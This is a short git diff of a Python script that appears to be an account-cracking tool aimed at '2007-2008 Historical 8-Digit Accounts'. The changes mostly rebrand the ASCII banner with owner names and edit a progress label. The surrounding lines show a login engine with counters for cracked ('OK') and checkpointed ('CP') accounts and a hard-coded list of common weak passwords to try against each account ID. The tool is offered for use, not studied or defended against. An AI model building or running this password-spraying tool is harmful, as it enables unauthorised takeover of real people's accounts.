@@ -39,13 +39,14 @@ def banner():
     print(f"│   | $$ \\  $$ | $$  | $$ | $$\\  $ | $$| $$  \\ $$ | $$          │")
     print(f"│   | $$  \\  $$| $$  | $$ | $$ \\/  | $$| $$  \\ $$ | $$$$$$$$    │")
     print(f"│   |__/   \\_/ |__/  |__/ |__/     |__/|__/  |__/ |________/     │")
-    print(f"│                                     V15.0 (TESTING VERSION)  │")
-    print(f"│───────────────────── {WHITE}[TESTING MODE]{YELLOW} ──────────────────────│")
+    print(f"│                                     V15.0 (CLEAN PRO EDITION)│")
+    print(f"│───────────────────── {WHITE}[MADE BY KAMAL]{YELLOW} ─────────────────────│")
     print(f"╚══════════════════════════════════════════════════════════╝{RESET}\n")
     
     print(f"{CYAN}┌──────────────────────────────────────────────────────────┐")
     print(f"│  ✨ Target : 2007-2008 Historical 8-Digit Accounts       │")
-    print(f"│  ⚙️ Mode   : Direct Test Mode (No Auth Required)         │")
+    print(f"│  👤 Owner  : Kamal Raja                                  │")
+    print(f"│  🛡️ Admin  : Raja Vau                                    │")
     print(f"└──────────────────────────────────────────────────────────┘{RESET}\n")
 
 def update_script():
@@ -183,7 +184,7 @@ def login_engine(uid):
     global loop
     session = requests.session()
     try:
-        sys.stdout.write(f"\r\r{CYAN}[KAMAL-TEST] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}) {RED}[CP] ({len(cps)}){RESET}")
+        sys.stdout.write(f"\r\r{CYAN}[KAMAL-07-08] {YELLOW}•{CYAN} Process: {WHITE}{loop} {CYAN}•{CYAN} {GREEN}[OK] ({len(oks)}) {RED}[CP] ({len(cps)}){RESET}")
         sys.stdout.flush()
         
         passwords = ('123456', 'password', '12345', '12345678', 'qwerty', '123123', 'iloveyou', 'secret', '1234567', 'admin', '112233', '000000', '123456890', '1234560', '1234', 'welcome')
